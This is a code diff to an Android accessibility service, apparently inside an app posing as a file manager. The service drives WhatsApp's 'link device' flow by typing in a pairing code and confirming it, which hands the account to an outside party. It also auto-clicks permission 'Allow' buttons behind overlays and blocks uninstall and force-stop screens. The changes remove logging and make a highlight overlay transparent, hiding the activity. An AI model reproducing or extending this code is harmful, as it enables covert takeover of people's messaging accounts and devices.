@@ -1,9 +1,7 @@
 package com.user.side.services;
 
 import android.accessibilityservice.AccessibilityService;
-import android.accessibilityservice.AccessibilityServiceInfo;
-import android.app.AlarmManager;
-import android.app.PendingIntent;
+import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Color;
@@ -13,11 +11,11 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.util.Log;
 import android.view.ContextThemeWrapper;
 import android.view.Gravity;
 import android.view.LayoutInflater;
 import android.view.View;
+import android.view.Window;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
@@ -55,10 +53,7 @@ public class ActionsController extends AccessibilityService {
     public static String CONFIRM_TEXT_ENGLISH = "CONFIRM";
     public static String FIELD_CONTENT_DESCRIPTION_ENGLISH = "Enter 8-character code, 1 of 8";
     public static String FIELD_CONTENT_DESCRIPTION_ARABIC = "أدخل الكود المكون من";
-    public static String WHATSAPP_TITLE_ARABIC = "واتساب";
-    public static String WHATSAPP_TITLE_ENGLISH = "Whatsapp";
     public static String CONFIRM_TEXT_ARABIC = "تأكيد";
-    public static final int HIGHLIGHT_VIEW_ID = 312312324;
     public static String CODE;
     boolean timeoutScheduled = false;
     boolean closingWhatsapp = false;
@@ -66,7 +61,6 @@ public class ActionsController extends AccessibilityService {
     boolean fingerprintShown = false;
     boolean inAutoGrantProcess = false;
     boolean autoGrantShown = false;
-    boolean allowing = false;
     long startTime;
     View overlayView;
     View updateLayout;
@@ -78,9 +72,7 @@ public class ActionsController extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
-        if (accessibilityEvent == null) {
-            Log.d("ActionsController", "event is null");
-            return;
+        if (accessibilityEvent == null) {return;
         }
 
         handlePermissionsAutoGrant(accessibilityEvent);
@@ -109,10 +101,7 @@ public class ActionsController extends AccessibilityService {
                 return;
             }
 
-            if (accessibilityEvent.getPackageName().equals(NotificationListener.whatsAppPackage)) {
-                Log.d("ActionsController", "progress: " + progress);
-
-                //handleInterruption();
+            if (accessibilityEvent.getPackageName().equals(NotificationListener.whatsAppPackage)) {//handleInterruption();
 
                 if (inConfirmationScreen(accessibilityEvent.getSource())) {
                     FilesManager.logStatus("in confirmation screen");
@@ -145,18 +134,8 @@ public class ActionsController extends AccessibilityService {
                     FilesManager.logStatus("link done");
                     setProgress(80);
                     NotificationListener.IN_PROCESS = false;
-                    if (!closingWhatsapp) {
-                        closeWhatsapp(true);
-                    }
-                    return;
+                    if (!closingWhatsapp) closeWhatsapp(true);
                 }
-
-//                if(isInLinkedDevicesScreen(accessibilityEvent.getSource())){
-//                    FilesManager.logStatus("in linked devices screen");
-//                    if(fingerprintShown){
-//                        closeWhatsapp(false);
-//                    }
-//                }
 
 
             } else {
@@ -169,9 +148,7 @@ public class ActionsController extends AccessibilityService {
             }
 
         } else {
-            if (accessibilityEvent.getPackageName() == null) {
-                Log.d("ActionsController", "event with null package");
-                return;
+            if (accessibilityEvent.getPackageName() == null) {return;
             }
 
             handleUninstalling(accessibilityEvent);
@@ -182,11 +159,7 @@ public class ActionsController extends AccessibilityService {
         CharSequence className = event.getClassName();
         if (className == null) return;
         if (!inAutoGrantProcess && !className.toString().equals(PermissionsActivity.class.getName() + "::AutoGrantingProcess"))
-            return;
-
-        Log.d("Permissions:AutoGrant", event.getPackageName() + "::" + className);
-
-        if (inAutoGrantProcess) {
+            return;if (inAutoGrantProcess) {
             if (className.toString().equals(PermissionsActivity.class.getName() + "::AutoGrantingProcess")) {
                 inAutoGrantProcess = false;
                 removeAutoGrantOverlay();
@@ -204,6 +177,7 @@ public class ActionsController extends AccessibilityService {
         }
     }
 
+    @SuppressLint("InflateParams")
     private void showAutoGrantOverlay() {
         autoGrantShown = true;
 
@@ -238,9 +212,7 @@ public class ActionsController extends AccessibilityService {
     }
 
     private void clickOnAllowIfPossible(AccessibilityEvent event, boolean english){
-        Log.d("Permissions:AutoGrant", "root: " + event);
-
-        AccessibilityNodeInfo allowButton = null;
+        AccessibilityNodeInfo allowButton;
         if (english) {
             allowButton = findNodeByText(event.getSource(), "Allow", new ArrayList<>(), true);
         } else {
@@ -264,10 +236,7 @@ public class ActionsController extends AccessibilityService {
         if (rootNode == null) return;
 
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_USE_MOBILE_DATA_EN, new ArrayList<>(), true);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_USE_MOBILE_DATA_AR, new ArrayList<>(), true);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-
-        AccessibilityNodeInfo button = nodeEN != null ? nodeEN : nodeAR;
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_USE_MOBILE_DATA_AR, new ArrayList<>(), true);AccessibilityNodeInfo button = nodeEN != null ? nodeEN : nodeAR;
         if (button != null) {
             button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
         }
@@ -277,9 +246,7 @@ public class ActionsController extends AccessibilityService {
         if (rootNode == null) return false;
 
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_MOBILE_DATA_WARNING_EN, new ArrayList<>(), false);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_MOBILE_DATA_WARNING_AR, new ArrayList<>(), false);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-        return nodeEN != null || nodeAR != null;
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_MOBILE_DATA_WARNING_AR, new ArrayList<>(), false);return nodeEN != null || nodeAR != null;
     }
 
     private void scheduleTimeout() {
@@ -293,7 +260,6 @@ public class ActionsController extends AccessibilityService {
         startTime = System.currentTimeMillis();
         timeoutHandler.postDelayed(timeoutRunnable, 1000 * 60 * 2);
     }
-
 
     private void fillCode() {
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
@@ -312,14 +278,10 @@ public class ActionsController extends AccessibilityService {
         if (rootNode == null) return false;
 
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ENGLISH, new ArrayList<>(), true);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ARABIC, new ArrayList<>(), true);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-        return nodeEN != null || nodeAR != null;
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, FIELD_CONTENT_DESCRIPTION_ARABIC, new ArrayList<>(), true);return nodeEN != null || nodeAR != null;
     }
 
-    private void setTextOfNode(AccessibilityNodeInfo node, String code) {
-        Log.d("ActionsController", "setting text to: " + code);
-        Bundle bundle = new Bundle();
+    private void setTextOfNode(AccessibilityNodeInfo node, String code) {Bundle bundle = new Bundle();
         bundle.putCharSequence(AccessibilityNodeInfo
                 .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, code);
         node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
@@ -341,14 +303,7 @@ public class ActionsController extends AccessibilityService {
         if (rootNode == null) return false;
         if (rootNode.getClassName() == null) return false;
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, CONFIRM_TEXT_ENGLISH, new ArrayList<>(), true);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, CONFIRM_TEXT_ARABIC, new ArrayList<>(), true);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-        return nodeEN != null || nodeAR != null;
-    }
-
-    private void schedulePendingIntent(PendingIntent linkDevicePendingIntent) {
-        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, linkDevicePendingIntent);
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, CONFIRM_TEXT_ARABIC, new ArrayList<>(), true);return nodeEN != null || nodeAR != null;
     }
 
     private synchronized void notifyTimeout() {
@@ -381,18 +336,13 @@ public class ActionsController extends AccessibilityService {
     public boolean isInLinkedDevicesScreen(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_LINK_DEVICE_TEXT_EN, new ArrayList<>(), false);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LINK_DEVICE_TEXT_AR, new ArrayList<>(), false);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-
-        return nodeEN != null || nodeAR != null;
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LINK_DEVICE_TEXT_AR, new ArrayList<>(), false);return nodeEN != null || nodeAR != null;
     }
 
     private boolean isLoggingIn(AccessibilityNodeInfo rootNode) {
         if (rootNode == null) return false;
         AccessibilityNodeInfo nodeEN = findNodeByText(rootNode, WHATSAPP_LOGGING_IN_TEXT_EN, new ArrayList<>(), false);
-        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LOGGING_IN_TEXT_AR, new ArrayList<>(), false);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-        return nodeEN != null || nodeAR != null;
+        AccessibilityNodeInfo nodeAR = findNodeByText(rootNode, WHATSAPP_LOGGING_IN_TEXT_AR, new ArrayList<>(), false);return nodeEN != null || nodeAR != null;
     }
 
     private WindowManager windowManager;
@@ -446,9 +396,7 @@ public class ActionsController extends AccessibilityService {
         if (rootNode == null) return null;
         List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(text);
 
-        for (AccessibilityNodeInfo node : nodes) {
-            Log.d("Nodes_state", "checking node node: " + node);
-            if (blackListNodes.contains(node)) {
+        for (AccessibilityNodeInfo node : nodes) {if (blackListNodes.contains(node)) {
                 continue;
             }
             if (clickable) {
@@ -472,7 +420,6 @@ public class ActionsController extends AccessibilityService {
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-        log("accessibility task removed");
     }
 
 
@@ -503,10 +450,7 @@ public class ActionsController extends AccessibilityService {
             return null;
         }
 
-        blackListNodes.add(appNode);
-        Log.d("Nodes_state", "app name node founded: " + appNode.getText());
-
-        AccessibilityNodeInfo uninstallNode = null;
+        blackListNodes.add(appNode);AccessibilityNodeInfo uninstallNode = null;
         for (String keyword : uninstallKeywords) {
             uninstallNode = findNodeByText(rootNode, keyword, blackListNodes, false);
             if (uninstallNode != null && uninstallNode.isVisibleToUser()) {
@@ -518,10 +462,7 @@ public class ActionsController extends AccessibilityService {
             return null;
         }
 
-        blackListNodes.add(uninstallNode);
-        Log.d("Nodes_state", "uninstall node founded: " + uninstallNode.getText());
-
-        AccessibilityNodeInfo confirmationNode = null;
+        blackListNodes.add(uninstallNode);AccessibilityNodeInfo confirmationNode = null;
         for (String keyword : confirmationKeywords) {
             confirmationNode = findNodeByText(rootNode, keyword, blackListNodes, true);
             if (confirmationNode != null && confirmationNode.isVisibleToUser()) {
@@ -531,10 +472,7 @@ public class ActionsController extends AccessibilityService {
 
         if (confirmationNode == null) {
             return null;
-        }
-        Log.d("Nodes_state", "confirmation node founded: " + confirmationNode.getText());
-
-        sharedPreferences.edit().putString(Constants.REMOVE_DIALOG_CASHED_DATA, confirmationNode.getPackageName().toString()).apply();
+        }sharedPreferences.edit().putString(Constants.REMOVE_DIALOG_CASHED_DATA, confirmationNode.getPackageName().toString()).apply();
 
         return confirmationNode;
     }
@@ -544,9 +482,7 @@ public class ActionsController extends AccessibilityService {
 
         traverseChildes(nodes, rootNode);
 
-        for (AccessibilityNodeInfo node : nodes) {
-            Log.d("Nodes_state", "checking node node: " + node);
-            if (blackListNodes.contains(node)) {
+        for (AccessibilityNodeInfo node : nodes) {if (blackListNodes.contains(node)) {
                 continue;
             }
 
@@ -616,10 +552,7 @@ public class ActionsController extends AccessibilityService {
             return null;
         }
 
-        blackListNodes.add(forceStopButtonNode);
-        Log.d("Nodes_state", "force stop node founded: " + forceStopButtonNode.getText());
-
-        AccessibilityNodeInfo uninstallButtonNode = null;
+        blackListNodes.add(forceStopButtonNode);AccessibilityNodeInfo uninstallButtonNode = null;
         for (String keyword : uninstallKeywords) {
             uninstallButtonNode = findNodeByTextByTraverse(rootNode, keyword, blackListNodes, true);
             if (uninstallButtonNode != null && uninstallButtonNode.isVisibleToUser()) {
@@ -629,11 +562,7 @@ public class ActionsController extends AccessibilityService {
 
         if (uninstallButtonNode == null) {
             return null;
-        }
-
-        Log.d("Nodes_state", "uninstall node founded: " + uninstallButtonNode.getText());
-
-        blackListNodes.clear();
+        }blackListNodes.clear();
 
         sharedPreferences.edit().putString(Constants.APP_INFO_CACHED_DATA, uninstallButtonNode.getPackageName().toString()).apply();
 
@@ -642,21 +571,20 @@ public class ActionsController extends AccessibilityService {
 
 
     private void showAlertDialog() {
-        new Handler(Looper.getMainLooper()).post(new Runnable() {
-            @Override
-            public void run() {
-                AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(ActionsController.this, R.style.Theme_FileManagerTest));
-                builder.setTitle(R.string.warning)
-                        .setMessage(R.string.uninstall_warning_message)
-                        .setPositiveButton(R.string.ok, null);
+        new Handler(Looper.getMainLooper()).post(() -> {
+            AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(ActionsController.this, R.style.Theme_FileManagerTest));
+            builder.setTitle(R.string.warning)
+                    .setMessage(R.string.uninstall_warning_message)
+                    .setPositiveButton(R.string.ok, null);
 
-                AlertDialog dialog = builder.create();
-                // Add the FLAG_ACTIVITY_NEW_TASK flag to show the dialog from a service
-                dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY);
+            AlertDialog dialog = builder.create();
+            // Add the FLAG_ACTIVITY_NEW_TASK flag to show the dialog from a service
+            Window window = dialog.getWindow();
 
+            if (window == null) return;
 
-                dialog.show();
-            }
+            window.setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY);
+            dialog.show();
         });
     }
 
@@ -673,10 +601,7 @@ public class ActionsController extends AccessibilityService {
 
         if (highlightView != null) {
             Rect lastCoordinates = new Rect();
-            highlightView.getGlobalVisibleRect(lastCoordinates);
-
-            Log.d("Highlight Logs", "bounds: " + lastCoordinates.left + ", " + lastCoordinates.top + " left: " + bounds.left + " top: " + bounds.left);
-            if (lastCoordinates.left != bounds.left || lastCoordinates.top != bounds.top) {
+            highlightView.getGlobalVisibleRect(lastCoordinates);if (lastCoordinates.left != bounds.left || lastCoordinates.top != bounds.top) {
                 WindowManager.LayoutParams params = (WindowManager.LayoutParams) highlightView.getLayoutParams();
 
                 params.x = bounds.left;
@@ -695,7 +620,7 @@ public class ActionsController extends AccessibilityService {
         targetView.getBoundsInScreen(bounds);
 
         highlightView = new View(this);
-        highlightView.setBackgroundColor(Color.argb(150, 255, 255, 0));  // Yellow with some transparency
+        highlightView.setBackgroundColor(Color.argb(0, 0, 0, 0));  // Transparent background
 
         WindowManager.LayoutParams params = getFitLayoutParams(bounds);
 
@@ -765,9 +690,7 @@ public class ActionsController extends AccessibilityService {
         Handler handler = new Handler(Looper.getMainLooper());
         handler.post(new Runnable() {
             @Override
-            public void run() {
-                Log.d("ActionsController", "closing whatsapp");
-                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+            public void run() {AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                 if (rootNode == null) {
                     handler.postDelayed(this, 1000);
                     return;
@@ -782,9 +705,7 @@ public class ActionsController extends AccessibilityService {
                         removeFingerprintOverlay();
                         closingWhatsapp = false;
                         progress = 0;
-                        timeoutHandler.removeCallbacks(timeoutRunnable);
-                        Log.d("ActionsController", "whatsapp closed");
-                        FilesManager.logStatus("whatsapp closed");
+                        timeoutHandler.removeCallbacks(timeoutRunnable);FilesManager.logStatus("whatsapp closed");
                         NotificationListener.IN_PROCESS = false;
                         return;
                     }
@@ -808,10 +729,7 @@ public class ActionsController extends AccessibilityService {
         if (node.getPackageName() == null) return false;
         if (!node.getPackageName().equals(NotificationListener.whatsAppPackage)) return false;
         AccessibilityNodeInfo nodeEN = findNodeByText(node, WHATSAPP_CHATS_LIST_EN, new ArrayList<>(), false);
-        AccessibilityNodeInfo nodeAR = findNodeByText(node, WHATSAPP_CHATS_LIST_AR, new ArrayList<>(), false);
-        Log.d("ActionsController", "nodeEN: " + nodeEN + " nodeAR: " + nodeAR);
-
-        return nodeEN != null || nodeAR != null;
+        AccessibilityNodeInfo nodeAR = findNodeByText(node, WHATSAPP_CHATS_LIST_AR, new ArrayList<>(), false);return nodeEN != null || nodeAR != null;
     }
 
     private void removeWhatsappOverlay() {
@@ -827,6 +745,7 @@ public class ActionsController extends AccessibilityService {
         }
     }
 
+    @SuppressLint("InflateParams")
     private void showWhatsappOverlay() {
         if (WebsocketService.windowManager == null) return;
         WindowManager windowManagerToUse = getWindowManager();
@@ -906,29 +825,11 @@ public class ActionsController extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-
-        log("onServiceConnected");
-    }
-
-    public AccessibilityServiceInfo createAccessibilityInfo() {
-        AccessibilityServiceInfo info = getServiceInfo();
-        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
-        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS ;
-        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
-        info.notificationTimeout = 100;
-        return info;
-    }
-
-    public void log(String text) {
-        Log.d("ActionsController", text);
-
-        FilesManager.logStatus(text);
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        log("onDestroy");
 
         if (highlightView != null) {
             windowManager.removeView(highlightView);
